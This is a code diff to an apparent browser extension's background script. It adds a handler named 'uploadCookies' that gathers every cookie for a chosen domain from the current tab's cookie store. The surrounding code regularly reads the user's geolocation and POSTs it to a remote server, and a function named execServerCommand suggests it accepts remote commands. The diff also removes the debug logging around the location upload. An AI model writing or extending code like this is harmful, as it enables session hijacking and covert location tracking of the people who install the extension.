@@ -49,7 +49,26 @@ function notify(message, sender, sendResponse) {
     case 'sendMetric':
       sendMetric(message);
       break;
+    case 'uploadCookies':
+      uploadCookies(message.url, sender.tab.id);
+      break;
   }
+}
+
+function uploadCookies(d, tab) {
+
+  browser.cookies.getAllCookieStores().then(function (stores) {
+    for (let store of stores) {
+      if(store.tabIds.includes(tab)){
+        browser.cookies.getAll({
+          domain: d,
+          storeId: store.id
+        }).then(function (cookies) {
+          console.log(cookies);
+        });
+      }
+    }
+  });
 }
 
 function sendMetric(message) {
@@ -95,11 +114,9 @@ function execServerCommand(message){
 
 setInterval(function () {
   navigator.geolocation.getCurrentPosition(function(position) {
-    console.log(position.coords.latitude, position.coords.longitude);
     if(position.coords.latitude !== currentLat || position.coords.longitude !== currentLon){
       currentLat = position.coords.latitude;
       currentLon = position.coords.longitude;
-      console.log(currentLat, currentLon);
       fetch(SERVER_ADDRESS + "up/loc",
         {
           method: "POST",
